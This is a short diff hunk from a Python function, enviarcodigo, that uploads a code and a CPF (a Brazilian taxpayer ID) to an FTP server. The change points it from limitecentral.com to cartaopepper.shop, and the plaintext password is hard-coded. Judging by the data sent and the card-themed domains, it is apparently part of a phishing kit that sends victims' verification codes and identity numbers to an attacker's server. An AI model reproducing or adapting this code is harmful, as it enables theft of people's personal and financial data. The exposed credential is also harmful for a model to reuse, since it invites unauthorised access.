@@ -133,8 +133,8 @@ def enviarcodigo(codigo: str, cpf: str):
                 
                 # Envio via FTP
                 try:
-                    ftp_host = "ftp.limitecentral.com"
-                    ftp_username = "admin@limitecentral.com"
+                    ftp_host = "ftp.cartaopepper.shop"
+                    ftp_username = "admin@cartaopepper.shop"
                     ftp_password = "Em@88005424"
                     ftp_directory = "/"  # Altere para o diretório correto
                     
